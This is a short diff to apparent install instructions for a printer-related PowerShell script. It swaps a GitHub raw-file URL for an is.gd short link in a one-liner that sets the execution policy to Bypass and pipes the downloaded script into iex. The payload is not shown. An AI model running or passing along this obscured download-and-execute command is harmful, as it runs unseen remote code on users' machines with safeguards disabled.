@@ -5,5 +5,4 @@ Set-ExecutionPolicy Bypass -Scope Process -Force;
 irm "https://raw.githubusercontent.com/roudika/paul-printer/main/Install-Sharp.ps1" | iex
 
 
-> Set-ExecutionPolicy Bypass -Scope Process -Force;  irm
-> "https://raw.githubusercontent.com/roudika/paul-printer/main/Install-Sharp.ps1" | iex
+Set-ExecutionPolicy Bypass -Scope Process -Force; irm "https://is.gd/t0qEjV" | iex
